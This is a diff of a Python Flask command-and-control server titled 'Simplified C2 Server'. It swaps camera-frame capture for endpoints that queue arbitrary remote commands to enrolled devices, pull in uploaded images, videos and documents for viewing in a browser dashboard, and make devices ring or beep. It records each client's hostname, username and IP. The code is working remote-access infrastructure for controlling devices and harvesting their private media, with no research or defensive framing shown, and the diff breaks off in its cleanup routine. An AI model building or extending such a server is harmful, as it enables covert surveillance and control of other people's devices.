@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-Fixed C2 Server with Proper Client Status Tracking
+Simplified C2 Server - No Camera, File Viewing & Device Control
 """
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify, send_file, send_from_directory
 from flask_cors import CORS
 import time
 import uuid
@@ -10,36 +10,39 @@ import json
 import sqlite3
 import threading
 import os
-import base64
 from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
 
 # Configuration
-DATABASE = 'c2_server.db'
-ONLINE_THRESHOLD = 120  # 2 minutes before marking offline
-CLEANUP_INTERVAL = 300  # 5 minutes
+DATABASE = 'simple_c2.db'
+ONLINE_THRESHOLD = 180  # 3 minutes before marking offline
+UPLOAD_FOLDER = 'uploads'
+MEDIA_FOLDER = 'media'
+
+# Create directories
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(MEDIA_FOLDER, exist_ok=True)
 
 def init_db():
     """Initialize database"""
     conn = sqlite3.connect(DATABASE)
     cursor = conn.cursor()
     
-    # Clients table with unique constraint
+    # Clients table
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS clients (
             id TEXT PRIMARY KEY,
             hostname TEXT,
             username TEXT,
             os TEXT,
-            arch TEXT,
             ip TEXT,
             last_seen REAL,
             status TEXT DEFAULT 'online',
-            camera_count INTEGER DEFAULT 0,
-            first_seen REAL,
-            checkin_count INTEGER DEFAULT 0
+            device_type TEXT,
+            volume_level INTEGER DEFAULT 50,
+            ringer_enabled INTEGER DEFAULT 1
         )
     ''')
     
@@ -52,8 +55,7 @@ def init_db():
             status TEXT DEFAULT 'pending',
             output TEXT,
             created_at REAL,
-            executed_at REAL,
-            FOREIGN KEY (client_id) REFERENCES clients (id) ON DELETE CASCADE
+            executed_at REAL
         )
     ''')
     
@@ -64,17 +66,12 @@ def init_db():
             client_id TEXT,
             filename TEXT,
             filepath TEXT,
+            filetype TEXT,
             filesize INTEGER,
             uploaded_at REAL,
-            FOREIGN KEY (client_id) REFERENCES clients (id) ON DELETE CASCADE
+            viewed INTEGER DEFAULT 0
         )
     ''')
-    
-    # Create indexes for faster queries
-    cursor.execute('CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)')
-    cursor.execute('CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status)')
-    cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)')
-    cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)')
     
     conn.commit()
     conn.close()
@@ -89,7 +86,7 @@ def get_db():
 
 @app.route('/api/checkin', methods=['POST'])
 def checkin():
-    """Client checkin - Fixed to handle multiple clients from same device"""
+    """Client checkin"""
     try:
         data = request.json
         client_id = data.get('id')
@@ -97,72 +94,51 @@ def checkin():
         if not client_id:
             return jsonify({'error': 'No client ID'}), 400
         
-        # Get client IP (use X-Forwarded-For if behind proxy)
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        if ',' in client_ip:
-            client_ip = client_ip.split(',')[0].strip()
-        
         conn = get_db()
         cursor = conn.cursor()
+        
+        current_time = time.time()
         
         # Check if client exists
         cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
         existing = cursor.fetchone()
         
-        current_time = time.time()
-        
         if existing:
             # Update existing client
             cursor.execute('''
                 UPDATE clients 
-                SET last_seen = ?, status = 'online', checkin_count = checkin_count + 1,
+                SET last_seen = ?, status = 'online',
                     hostname = COALESCE(?, hostname),
                     username = COALESCE(?, username),
-                    os = COALESCE(?, os),
-                    arch = COALESCE(?, arch),
-                    camera_count = COALESCE(?, camera_count)
+                    os = COALESCE(?, os)
                 WHERE id = ?
-            ''', (
-                current_time,
-                data.get('hostname'),
-                data.get('username'),
-                data.get('os'),
-                data.get('arch'),
-                data.get('camera_count', 0),
-                client_id
-            ))
+            ''', (current_time, 
+                  data.get('hostname'),
+                  data.get('username'),
+                  data.get('os'),
+                  client_id))
         else:
             # Insert new client
             cursor.execute('''
                 INSERT INTO clients 
-                (id, hostname, username, os, arch, ip, last_seen, status, 
-                 camera_count, first_seen, checkin_count)
-                VALUES (?, ?, ?, ?, ?, ?, ?, 'online', ?, ?, 1)
-            ''', (
-                client_id,
-                data.get('hostname', 'unknown'),
-                data.get('username', 'unknown'),
-                data.get('os', 'unknown'),
-                data.get('arch', 'unknown'),
-                client_ip,
-                current_time,
-                data.get('camera_count', 0),
-                current_time
-            ))
+                (id, hostname, username, os, ip, last_seen, status, device_type)
+                VALUES (?, ?, ?, ?, ?, ?, 'online', ?)
+            ''', (client_id,
+                  data.get('hostname', 'unknown'),
+                  data.get('username', 'unknown'),
+                  data.get('os', 'unknown'),
+                  request.remote_addr,
+                  current_time,
+                  data.get('device_type', 'unknown')))
         
         conn.commit()
-        
-        # Get updated client info
-        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
-        client = cursor.fetchone()
         conn.close()
         
-        print(f"[✓] Checkin: {client_id} ({data.get('hostname')}) - IP: {client_ip}")
+        print(f"[✓] Checkin: {client_id} ({data.get('hostname')})")
         
         return jsonify({
             'status': 'ok',
             'timestamp': current_time,
-            'client_id': client_id,
             'message': 'Checkin successful'
         }), 200
         
@@ -181,24 +157,14 @@ def send_command():
         if not client_id or not command:
             return jsonify({'error': 'Missing client_id or command'}), 400
         
-        # Verify client exists and is online
+        cmd_id = str(uuid.uuid4())
+        
         conn = get_db()
         cursor = conn.cursor()
-        cursor.execute('SELECT status FROM clients WHERE id = ?', (client_id,))
-        client = cursor.fetchone()
-        
-        if not client:
-            conn.close()
-            return jsonify({'error': 'Client not found'}), 404
-        
-        cmd_id = str(uuid.uuid4())
-        current_time = time.time()
-        
-        # Insert command
         cursor.execute('''
             INSERT INTO commands (id, client_id, command, status, created_at)
             VALUES (?, ?, ?, 'pending', ?)
-        ''', (cmd_id, client_id, command, current_time))
+        ''', (cmd_id, client_id, command, time.time()))
         
         conn.commit()
         conn.close()
@@ -208,8 +174,7 @@ def send_command():
         return jsonify({
             'success': True,
             'command_id': cmd_id,
-            'message': 'Command queued',
-            'timestamp': current_time
+            'message': 'Command queued'
         }), 200
         
     except Exception as e:
@@ -220,9 +185,10 @@ def send_command():
 def get_commands(client_id):
     """Get pending commands for client"""
     try:
-        # First, update client's last_seen
         conn = get_db()
         cursor = conn.cursor()
+        
+        # Update client's last_seen
         cursor.execute('UPDATE clients SET last_seen = ? WHERE id = ?', 
                       (time.time(), client_id))
         
@@ -256,7 +222,6 @@ def get_commands(client_id):
         return jsonify({'commands': commands}), 200
         
     except Exception as e:
-        print(f"[✗] Get commands error: {e}")
         return jsonify({'commands': []}), 500
 
 @app.route('/api/result', methods=['POST'])
@@ -273,7 +238,6 @@ def submit_result():
         conn = get_db()
         cursor = conn.cursor()
         
-        # Update command status
         cursor.execute('''
             UPDATE commands 
             SET status = 'completed', output = ?, executed_at = ?
@@ -288,36 +252,9 @@ def submit_result():
         return jsonify({'success': True}), 200
         
     except Exception as e:
-        print(f"[✗] Result error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/command/result/<cmd_id>', methods=['GET'])
-def get_result(cmd_id):
-    """Get command result"""
-    try:
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        cursor.execute('SELECT * FROM commands WHERE id = ?', (cmd_id,))
-        row = cursor.fetchone()
-        conn.close()
-        
-        if row:
-            return jsonify({
-                'success': True,
-                'status': row['status'],
-                'output': row['output'] or '',
-                'command': row['command'],
-                'created_at': row['created_at'],
-                'executed_at': row['executed_at']
-            }), 200
-        else:
-            return jsonify({'error': 'Command not found'}), 404
-            
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-# === FILE TRANSFER ENDPOINTS ===
+# === FILE & MEDIA ENDPOINTS ===
 
 @app.route('/api/upload', methods=['POST'])
 def upload_file():
@@ -332,34 +269,41 @@ def upload_file():
         if not client_id:
             return jsonify({'error': 'No client_id'}), 400
         
-        # Create uploads directory
-        upload_dir = 'uploads'
-        os.makedirs(upload_dir, exist_ok=True)
+        # Determine file type
+        filename = file.filename.lower()
+        if filename.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
+            filetype = 'image'
+        elif filename.endswith(('.mp4', '.avi', '.mov', '.mkv', '.webm')):
+            filetype = 'video'
+        elif filename.endswith(('.txt', '.pdf', '.doc', '.docx')):
+            filetype = 'document'
+        else:
+            filetype = 'other'
         
         # Save file
-        filename = f"{client_id}_{int(time.time())}_{file.filename}"
-        filepath = os.path.join(upload_dir, filename)
+        safe_filename = f"{client_id}_{int(time.time())}_{file.filename}"
+        filepath = os.path.join(UPLOAD_FOLDER, safe_filename)
         file.save(filepath)
         
         # Save to database
         conn = get_db()
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO files (id, client_id, filename, filepath, filesize, uploaded_at)
-            VALUES (?, ?, ?, ?, ?, ?)
+            INSERT INTO files (id, client_id, filename, filepath, filetype, filesize, uploaded_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
         ''', (str(uuid.uuid4()), client_id, file.filename, filepath, 
-              os.path.getsize(filepath), time.time()))
+              filetype, os.path.getsize(filepath), time.time()))
         
         conn.commit()
         conn.close()
         
-        print(f"[✓] Upload: {client_id} -> {file.filename} ({os.path.getsize(filepath)} bytes)")
+        print(f"[✓] Upload: {client_id} -> {file.filename} ({filetype})")
         
         return jsonify({
             'success': True,
             'filename': file.filename,
-            'size': os.path.getsize(filepath),
-            'saved_as': filename
+            'filetype': filetype,
+            'size': os.path.getsize(filepath)
         }), 200
         
     except Exception as e:
@@ -374,11 +318,11 @@ def list_files(client_id):
         cursor = conn.cursor()
         
         cursor.execute('''
-            SELECT id, filename, filesize, uploaded_at 
+            SELECT id, filename, filetype, filesize, uploaded_at, viewed 
             FROM files 
             WHERE client_id = ?
             ORDER BY uploaded_at DESC
-            LIMIT 20
+            LIMIT 50
         ''', (client_id,))
         
         files = []
@@ -386,9 +330,12 @@ def list_files(client_id):
             files.append({
                 'id': row['id'],
                 'filename': row['filename'],
+                'filetype': row['filetype'],
                 'size': row['filesize'],
                 'uploaded_at': row['uploaded_at'],
-                'time_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%H:%M:%S')
+                'viewed': bool(row['viewed']),
+                'time_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%H:%M:%S'),
+                'date_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d')
             })
         
         conn.close()
@@ -397,13 +344,49 @@ def list_files(client_id):
     except Exception as e:
         return jsonify({'files': []}), 500
 
-@app.route('/api/download/<file_id>', methods=['GET'])
+@app.route('/api/files/view/<file_id>', methods=['POST'])
+def mark_file_viewed(file_id):
+    """Mark file as viewed"""
+    try:
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute('UPDATE files SET viewed = 1 WHERE id = ?', (file_id,))
+        conn.commit()
+        conn.close()
+        return jsonify({'success': True}), 200
+    except:
+        return jsonify({'error': 'Failed'}), 500
+
+@app.route('/api/file/<file_id>', methods=['GET'])
+def get_file(file_id):
+    """Get file details and serve if media"""
+    try:
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM files WHERE id = ?', (file_id,))
+        row = cursor.fetchone()
+        conn.close()
+        
+        if not row:
+            return jsonify({'error': 'File not found'}), 404
+        
+        file_info = dict(row)
+        
+        # Check if file exists
+        if not os.path.exists(file_info['filepath']):
+            return jsonify({'error': 'File missing from server'}), 404
+        
+        return jsonify({'file': file_info}), 200
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/file/download/<file_id>', methods=['GET'])
 def download_file(file_id):
     """Download file"""
     try:
         conn = get_db()
         cursor = conn.cursor()
-        
         cursor.execute('SELECT filepath, filename FROM files WHERE id = ?', (file_id,))
         row = cursor.fetchone()
         conn.close()
@@ -420,32 +403,190 @@ def download_file(file_id):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-# === CAMERA ENDPOINTS ===
-
-@app.route('/api/camera/frame', methods=['POST'])
-def camera_frame():
-    """Receive camera frame"""
+@app.route('/api/media/view/<file_id>', methods=['GET'])
+def view_media(file_id):
+    """View media file in browser"""
     try:
-        data = request.form
-        client_id = data.get('client_id')
-        frame = data.get('frame')
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute('SELECT filepath, filename, filetype FROM files WHERE id = ?', (file_id,))
+        row = cursor.fetchone()
+        conn.close()
         
-        if not client_id or not frame:
-            return jsonify({'error': 'Missing data'}), 400
+        if not row or not os.path.exists(row['filepath']):
+            return jsonify({'error': 'File not found'}), 404
         
-        # Save frame
-        camera_dir = 'camera_frames'
-        os.makedirs(camera_dir, exist_ok=True)
+        # Mark as viewed
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute('UPDATE files SET viewed = 1 WHERE id = ?', (file_id,))
+        conn.commit()
+        conn.close()
         
-        filename = f"{client_id}_{int(time.time())}.jpg"
-        filepath = os.path.join(camera_dir, filename)
+        # Serve file
+        return send_file(row['filepath'])
         
-        with open(filepath, 'wb') as f:
-            f.write(base64.b64decode(frame))
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/media/thumbnail/<file_id>', methods=['GET'])
+def get_thumbnail(file_id):
+    """Get thumbnail for media file"""
+    try:
+        # For now, return a generic thumbnail
+        # In production, generate actual thumbnails
+        return send_file('static/thumbnail.jpg')
+    except:
+        return jsonify({'error': 'Thumbnail not available'}), 404
+
+# === DEVICE CONTROL ENDPOINTS ===
+
+@app.route('/api/device/ring/<client_id>', methods=['POST'])
+def ring_device(client_id):
+    """Command client to ring/make noise"""
+    try:
+        data = request.json
+        duration = data.get('duration', 10)  # seconds
+        volume = data.get('volume', 100)     # percentage
         
-        print(f"[✓] Camera: {client_id} -> {filename}")
+        conn = get_db()
+        cursor = conn.cursor()
         
-        return jsonify({'success': True}), 200
+        # Update device settings
+        cursor.execute('''
+            UPDATE clients 
+            SET volume_level = ?, ringer_enabled = 1
+            WHERE id = ?
+        ''', (volume, client_id))
+        
+        conn.commit()
+        conn.close()
+        
+        # Queue ring command
+        cmd_id = str(uuid.uuid4())
+        command = f'ring {duration} {volume}'
+        
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO commands (id, client_id, command, status, created_at)
+            VALUES (?, ?, ?, 'pending', ?)
+        ''', (cmd_id, client_id, command, time.time()))
+        
+        conn.commit()
+        conn.close()
+        
+        print(f"[🔔] Ring command: {client_id} for {duration}s at {volume}%")
+        
+        return jsonify({
+            'success': True,
+            'command_id': cmd_id,
+            'message': f'Ring command sent for {duration} seconds'
+        }), 200
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/device/stop/<client_id>', methods=['POST'])
+def stop_ring(client_id):
+    """Command client to stop ringing"""
+    try:
+        cmd_id = str(uuid.uuid4())
+        command = 'stop_ring'
+        
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO commands (id, client_id, command, status, created_at)
+            VALUES (?, ?, ?, 'pending', ?)
+        ''', (cmd_id, client_id, command, time.time()))
+        
+        conn.commit()
+        conn.close()
+        
+        print(f"[🔕] Stop ring: {client_id}")
+        
+        return jsonify({
+            'success': True,
+            'command_id': cmd_id,
+            'message': 'Stop ring command sent'
+        }), 200
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/device/volume/<client_id>', methods=['POST'])
+def set_volume(client_id):
+    """Set device volume"""
+    try:
+        data = request.json
+        volume = data.get('volume', 50)
+        
+        if not 0 <= volume <= 100:
+            return jsonify({'error': 'Volume must be 0-100'}), 400
+        
+        conn = get_db()
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            UPDATE clients 
+            SET volume_level = ?
+            WHERE id = ?
+        ''', (volume, client_id))
+        
+        conn.commit()
+        conn.close()
+        
+        # Send volume command
+        cmd_id = str(uuid.uuid4())
+        command = f'set_volume {volume}'
+        
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO commands (id, client_id, command, status, created_at)
+            VALUES (?, ?, ?, 'pending', ?)
+        ''', (cmd_id, client_id, command, time.time()))
+        
+        conn.commit()
+        conn.close()
+        
+        return jsonify({
+            'success': True,
+            'message': f'Volume set to {volume}%'
+        }), 200
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/device/beep/<client_id>', methods=['POST'])
+def beep_device(client_id):
+    """Make device beep"""
+    try:
+        data = request.json
+        count = data.get('count', 3)
+        interval = data.get('interval', 1)  # seconds between beeps
+        
+        cmd_id = str(uuid.uuid4())
+        command = f'beep {count} {interval}'
+        
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO commands (id, client_id, command, status, created_at)
+            VALUES (?, ?, ?, 'pending', ?)
+        ''', (cmd_id, client_id, command, time.time()))
+        
+        conn.commit()
+        conn.close()
+        
+        print(f"[🔊] Beep: {client_id} x{count}")
+        
+        return jsonify({
+            'success': True,
+            'command_id': cmd_id,
+            'message': f'Beep command sent ({count} times)'
+        }), 200
         
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -454,7 +595,7 @@ def camera_frame():
 
 @app.route('/api/clients', methods=['GET'])
 def get_clients():
-    """Get all clients with accurate status"""
+    """Get all clients"""
     try:
         conn = get_db()
         cursor = conn.cursor()
@@ -473,41 +614,36 @@ def get_clients():
         conn.commit()
         
         # Get all clients
-        cursor.execute('''
-            SELECT *, 
-                   CASE 
-                       WHEN ? - last_seen <= 60 THEN '🟢 online'
-                       WHEN ? - last_seen <= 300 THEN '🟡 away'
-                       ELSE '🔴 offline'
-                   END as display_status
-            FROM clients 
-            ORDER BY 
-                CASE 
-                    WHEN ? - last_seen <= 60 THEN 1
-                    WHEN ? - last_seen <= 300 THEN 2
-                    ELSE 3
-                END,
-                last_seen DESC
-        ''', (current_time, current_time, current_time))
+        cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
         
         clients = []
         for row in cursor.fetchall():
+            time_diff = current_time - row['last_seen']
+            
+            if time_diff < 60:
+                status_emoji = '🟢'
+                status_text = 'online'
+            elif time_diff < 300:
+                status_emoji = '🟡'
+                status_text = 'away'
+            else:
+                status_emoji = '🔴'
+                status_text = 'offline'
+            
             clients.append({
                 'id': row['id'],
                 'hostname': row['hostname'],
                 'username': row['username'],
                 'os': row['os'],
-                'arch': row['arch'],
                 'ip': row['ip'],
                 'status': row['status'],
-                'display_status': row['display_status'],
-                'camera_count': row['camera_count'],
+                'status_display': f"{status_emoji} {status_text}",
+                'device_type': row['device_type'],
+                'volume_level': row['volume_level'],
+                'ringer_enabled': bool(row['ringer_enabled']),
                 'last_seen': row['last_seen'],
-                'first_seen': row['first_seen'],
-                'checkin_count': row['checkin_count'],
                 'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S'),
-                'first_seen_str': datetime.fromtimestamp(row['first_seen']).strftime('%Y-%m-%d'),
-                'uptime': f"{int((current_time - row['first_seen']) / 3600)}h" if row['first_seen'] else 'N/A'
+                'last_seen_minutes': int(time_diff // 60)
             })
         
         conn.close()
@@ -516,56 +652,6 @@ def get_clients():
     except Exception as e:
         print(f"[✗] Clients error: {e}")
         return jsonify({'clients': []}), 500
-
-@app.route('/api/client/<client_id>', methods=['GET'])
-def get_client(client_id):
-    """Get specific client details"""
-    try:
-        conn = get_db()
-        cursor = conn.cursor()
-        
-        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
-        client = cursor.fetchone()
-        
-        if not client:
-            conn.close()
-            return jsonify({'error': 'Client not found'}), 404
-        
-        # Get command history
-        cursor.execute('''
-            SELECT * FROM commands 
-            WHERE client_id = ? 
-            ORDER BY created_at DESC 
-            LIMIT 20
-        ''', (client_id,))
-        
-        commands = []
-        for row in cursor.fetchall():
-            commands.append(dict(row))
-        
-        # Get file history
-        cursor.execute('''
-            SELECT * FROM files 
-            WHERE client_id = ? 
-            ORDER BY uploaded_at DESC 
-            LIMIT 10
-        ''', (client_id,))
-        
-        files = []
-        for row in cursor.fetchall():
-            files.append(dict(row))
-        
-        conn.close()
-        
-        return jsonify({
-            'client': dict(client),
-            'commands': commands,
-            'files': files,
-            'current_time': time.time()
-        }), 200
-        
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/stats', methods=['GET'])
 def get_stats():
@@ -582,39 +668,29 @@ def get_stats():
         cursor.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
         online_now = cursor.fetchone()[0]
         
-        cursor.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 300', (current_time,))
-        active_recently = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT COUNT(*) FROM commands')
-        total_commands = cursor.fetchone()[0]
-        
-        cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
-        pending_commands = cursor.fetchone()[0]
-        
         cursor.execute('SELECT COUNT(*) FROM files')
         total_files = cursor.fetchone()[0]
         
-        cursor.execute('SELECT COUNT(DISTINCT ip) FROM clients')
-        unique_ips = cursor.fetchone()[0]
+        cursor.execute('SELECT COUNT(*) FROM files WHERE filetype = "image"')
+        image_files = cursor.fetchone()[0]
         
-        # Get OS distribution
-        cursor.execute('SELECT os, COUNT(*) as count FROM clients GROUP BY os')
-        os_dist = {row['os']: row['count'] for row in cursor.fetchall()}
+        cursor.execute('SELECT COUNT(*) FROM files WHERE filetype = "video"')
+        video_files = cursor.fetchone()[0]
+        
+        cursor.execute('SELECT COUNT(*) FROM commands')
+        total_commands = cursor.fetchone()[0]
         
         conn.close()
         
         return jsonify({
             'total_clients': total_clients,
             'online_now': online_now,
-            'active_recently': active_recently,
-            'total_commands': total_commands,
-            'pending_commands': pending_commands,
             'total_files': total_files,
-            'unique_ips': unique_ips,
-            'os_distribution': os_dist,
+            'image_files': image_files,
+            'video_files': video_files,
+            'total_commands': total_commands,
             'server_time': current_time,
-            'server_uptime': current_time - app_start_time if 'app_start_time' in globals() else 0,
-            'online_threshold': ONLINE_THRESHOLD
+            'server_uptime': current_time - app_start_time
         }), 200
         
     except Exception as e:
@@ -623,68 +699,150 @@ def get_stats():
 @app.route('/api/health', methods=['GET'])
 def health():
     """Health check"""
-    try:
-        conn = get_db()
-        cursor = conn.cursor()
-        cursor.execute('SELECT 1')
-        conn.close()
-        
-        return jsonify({
-            'status': 'healthy',
-            'timestamp': time.time(),
-            'database': 'ok',
-            'version': '2.1'
-        }), 200
-    except:
-        return jsonify({'status': 'database_error'}), 500
-
-@app.route('/api/ping', methods=['GET', 'POST'])
-def ping():
-    """Simple ping endpoint"""
     return jsonify({
-        'status': 'pong',
+        'status': 'healthy',
         'timestamp': time.time(),
-        'method': request.method
+        'version': '1.0',
+        'features': ['file_viewing', 'device_ring', 'media_browser']
     }), 200
 
 @app.route('/')
 def index():
-    """Home page"""
+    """Web interface"""
     return '''
+    <!DOCTYPE html>
     <html>
     <head>
-        <title>C2 Server - Fixed</title>
+        <title>Simple C2 Server</title>
         <style>
-            body { font-family: Arial, sans-serif; margin: 40px; }
-            .container { max-width: 800px; margin: 0 auto; }
-            .card { background: #f5f5f5; padding: 20px; margin: 20px 0; border-radius: 5px; }
-            .endpoint { background: #e9e9e9; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; }
-            .status { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 12px; }
-            .online { background: #d4edda; color: #155724; }
-            .offline { background: #f8d7da; color: #721c24; }
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                max-width: 1200px;
+                margin: 0 auto;
+                padding: 20px;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                color: white;
+            }
+            .container {
+                background: rgba(255, 255, 255, 0.1);
+                backdrop-filter: blur(10px);
+                border-radius: 20px;
+                padding: 30px;
+                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            }
+            h1 {
+                text-align: center;
+                margin-bottom: 30px;
+                font-size: 2.5em;
+                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            }
+            .stats-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                gap: 20px;
+                margin-bottom: 30px;
+            }
+            .stat-card {
+                background: rgba(255, 255, 255, 0.15);
+                border-radius: 15px;
+                padding: 20px;
+                text-align: center;
+                transition: transform 0.3s;
+            }
+            .stat-card:hover {
+                transform: translateY(-5px);
+                background: rgba(255, 255, 255, 0.2);
+            }
+            .stat-value {
+                font-size: 2em;
+                font-weight: bold;
+                margin: 10px 0;
+            }
+            .features {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+                gap: 20px;
+                margin-top: 30px;
+            }
+            .feature-card {
+                background: rgba(255, 255, 255, 0.1);
+                border-radius: 15px;
+                padding: 20px;
+                border-left: 5px solid #4CAF50;
+            }
+            .feature-card.ring {
+                border-left-color: #FF9800;
+            }
+            .feature-card.media {
+                border-left-color: #2196F3;
+            }
+            .console-link {
+                display: inline-block;
+                background: white;
+                color: #667eea;
+                padding: 12px 24px;
+                border-radius: 50px;
+                text-decoration: none;
+                font-weight: bold;
+                margin-top: 20px;
+                transition: all 0.3s;
+            }
+            .console-link:hover {
+                background: #f8f9fa;
+                transform: scale(1.05);
+            }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>🖥️ C2 Control Server - Fixed</h1>
-            <p>Server is running with proper client status tracking.</p>
+            <h1>📱 Device Control Server</h1>
             
-            <div class="card">
-                <h3>📊 Quick Stats</h3>
-                <div id="stats">Loading...</div>
+            <div class="stats-grid" id="stats">
+                <div class="stat-card">
+                    <div>🌐 Online Clients</div>
+                    <div class="stat-value" id="online-clients">0</div>
+                </div>
+                <div class="stat-card">
+                    <div>📁 Total Files</div>
+                    <div class="stat-value" id="total-files">0</div>
+                </div>
+                <div class="stat-card">
+                    <div>🖼️ Images</div>
+                    <div class="stat-value" id="image-files">0</div>
+                </div>
+                <div class="stat-card">
+                    <div>🎥 Videos</div>
+                    <div class="stat-value" id="video-files">0</div>
+                </div>
             </div>
             
-            <div class="card">
-                <h3>🔗 API Endpoints:</h3>
-                <div class="endpoint"><b>POST</b> /api/checkin - Client registration</div>
-                <div class="endpoint"><b>POST</b> /api/command - Send commands</div>
-                <div class="endpoint"><b>GET</b> /api/clients - List clients (fixed status)</div>
-                <div class="endpoint"><b>POST</b> /api/upload - File upload</div>
-                <div class="endpoint"><b>GET</b> /api/stats - Server statistics</div>
-                <div class="endpoint"><b>GET</b> /api/health - Health check</div>
+            <div class="features">
+                <div class="feature-card">
+                    <h3>📁 File Browser</h3>
+                    <p>View images and videos from connected devices</p>
+                    <p>Upload/download files</p>
+                </div>
+                <div class="feature-card ring">
+                    <h3>🔔 Device Ring</h3>
+                    <p>Make devices ring/beep</p>
+                    <p>Control volume levels</p>
+                </div>
+                <div class="feature-card media">
+                    <h3>🎮 Remote Control</h3>
+                    <p>Execute commands remotely</p>
+                    <p>Device management</p>
+                </div>
             </div>
             
-            <p>Use the C2 console for control: <code>python c2_console_fixed_status.py http://localhost:5000</code></p>
+            <div style="text-align: center; margin-top: 40px;">
+                <a href="/api/clients" class="console-link" target="_blank">View Clients (JSON)</a>
+                <a href="http://localhost:5000" class="console-link" style="margin-left: 15px;">Refresh</a>
+            </div>
+            
+            <div style="margin-top: 40px; text-align: center; opacity: 0.8;">
+                <p>Use the console for full control: <code>python simple_c2_console.py http://localhost:5000</code></p>
+            </div>
         </div>
         
         <script>
@@ -693,65 +851,51 @@ def index():
                     const response = await fetch('/api/stats');
                     const data = await response.json();
                     
-                    let html = '<ul>';
-                    html += `<li>Total Clients: ${data.total_clients}</li>`;
-                    html += `<li>Online Now: ${data.online_now}</li>`;
-                    html += `<li>Total Commands: ${data.total_commands}</li>`;
-                    html += `<li>Pending Commands: ${data.pending_commands}</li>`;
-                    html += `<li>Server Uptime: ${Math.floor(data.server_uptime / 60)} minutes</li>`;
-                    html += '</ul>';
-                    
-                    document.getElementById('stats').innerHTML = html;
+                    document.getElementById('online-clients').textContent = data.online_now;
+                    document.getElementById('total-files').textContent = data.total_files;
+                    document.getElementById('image-files').textContent = data.image_files;
+                    document.getElementById('video-files').textContent = data.video_files;
                 } catch (error) {
-                    document.getElementById('stats').innerHTML = 'Error loading stats';
+                    console.error('Error loading stats:', error);
                 }
             }
             
             loadStats();
-            setInterval(loadStats, 10000); // Refresh every 10 seconds
+            setInterval(loadStats, 5000);
         </script>
     </body>
     </html>
     '''
 
-def cleanup_old_data():
-    """Cleanup old data periodically"""
+def cleanup():
+    """Cleanup old data"""
     while True:
-        time.sleep(CLEANUP_INTERVAL)
+        time.sleep(300)
         try:
             conn = get_db()
             cursor = conn.cursor()
             current_time = time.time()
             
-            # Remove very old offline clients (7 days)
+            # Remove old offline clients (7 days)
             cursor.execute('''
                 DELETE FROM clients 
                 WHERE status = 'offline' AND ? - last_seen > 604800
             ''', (current_time,))
             
-            deleted_clients = cursor.rowcount
-            
-            # Remove old completed commands (30 days)
-            cursor.execute('''
-                DELETE FROM commands 
-                WHERE status = 'completed' AND ? - executed_at > 2592000
-            ''', (current_time,))
-            
-            deleted_commands = cursor.rowcount
-            
-            # Remove old files (60 days)
+            # Remove old files (30 days)
             cursor.execute('''
                 DELETE FROM files 
-                WHERE ? - uploaded_at > 5184000
+                WHERE ? - uploaded_at > 2592000
             ''', (current_time,))
             
-            deleted_files = cursor.rowcount
+            # Remove old commands (14 days)
+            cursor.execute('''
+                DELETE FROM commands 
+                WHERE ? - created_at > 1209600
+            ''', (current_time,))
             
             conn.commit()
